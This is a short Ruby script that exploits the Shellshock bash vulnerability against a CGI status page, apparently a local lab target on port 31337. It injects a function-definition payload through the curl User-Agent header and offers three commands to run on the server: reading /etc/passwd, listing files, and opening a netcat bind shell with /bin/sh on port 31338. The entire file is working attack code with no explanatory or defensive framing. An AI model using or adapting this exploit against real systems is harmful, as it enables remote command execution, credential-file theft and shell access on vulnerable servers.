#!/usr/bin/env ruby

target = 'http://localhost:31337/cgi-bin/status'

payloads = {
  :etc_passwd => "/bin/cat /etc/passwd",
  :ls         => "/bin/ls",
  :shell      => "/usr/bin/nc -l -p 31338 -e /bin/sh"
}

my_payload   = payloads[:etc_passwd]
my_payload ||= payloads.sample[1]

full_payload = "() { ls;};echo \"Content-type: text/plain\"; echo; echo; #{my_payload}"

command = "curl -A '#{full_payload}' #{target}"

puts `#{command}`
